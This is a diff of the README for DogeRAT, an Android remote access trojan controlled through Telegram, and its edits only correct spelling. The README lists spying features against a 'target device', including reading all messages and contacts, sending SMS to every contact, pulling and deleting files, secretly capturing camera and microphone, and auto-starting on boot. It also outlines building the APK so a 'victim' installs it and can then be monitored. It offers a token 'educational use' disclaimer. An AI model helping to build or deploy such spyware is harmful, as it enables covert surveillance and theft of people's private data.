@@ -6,7 +6,7 @@
 #                     DOGERAT
 
 A multifunctional Telegram based Android RAT  without port forwarding.
-- VIDEO TUTORIALS  AVIALBLE HERE
+- VIDEO TUTORIALS  AVAILABLE HERE
 https://shivaya-dav.github.io/dogeweb/
 ## Panel Screenshot
 ![Logo](https://999xprofit.com/dogs/scr.jpg)
@@ -14,7 +14,7 @@ https://shivaya-dav.github.io/dogeweb/
  - 🔴 Real time
 - 🌐 custom web view
 - 🔔 notification reader
-- 🔔 notification sender (send custom notification that apper on target device with custom click link)
+- 🔔 notification sender (send custom notification that appear on target device with custom click link)
 - 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
 - 📡 receive information about simcard provider
 - 📳 vibrate target device
@@ -22,11 +22,11 @@ https://shivaya-dav.github.io/dogeweb/
 - ✉️ receive all target message
 - ✉️ send sms with target device to any number
 - ✉️ send sms with target device to all of his/her contacts
-- 👤 recive all target contacts
+- 👤 receive all target contacts
 - 💻 receive list of all installedd apps in target device
 - 📁 receive any file or folder from target device
 - 📁 delete any file or folder from target device
-- 📷 capture main and front camera
+- 📷 capture image main and front camera
 - 🎙 capture microphone (with custom duration)
 - 📋 receive last clipboard text
 - ✅️ auto start after device boot
@@ -79,17 +79,17 @@ NOTE : USE APK V1 AND V2 WITH OLD SERVER CODE
 }
 ```
 - note: In webview you can add any website 
-- when victim will open apk given website will be open in apk
+- when victim open apk, given website will be open in apk
 - must replace https to wss
 - click on save, and go back
 ![App Screenshot](https://999xprofit.com/dogs/12.jpg)
-- clcik on smail and wait 3/4 second
+- clcik on smali and wait 3/4 second
 - Now build the apk
 - and install in any phone
 ![App Screenshot](https://999xprofit.com/dogs/13.jpg)
 - now go to BotFather clcik on your botusername
  - start your bot 
- - now you can monitor all device who will install the apk
+ - now you can monitor all device and see who has install the apk
 ![App Screenshot](https://999xprofit.com/dogs/15.jpg)
 
 ### ❤️Thank you Supporters❤️
@@ -101,7 +101,7 @@ NOTE : USE APK V1 AND V2 WITH OLD SERVER CODE
 
 ## Disclaimer
 
-Devolper Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
+Developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
 Dogerat is built for both Educational and Internal use ONLY.
 - Make sure the instagram username is @shvaya.dav and Telegram shivaya_dav beware from scam
 
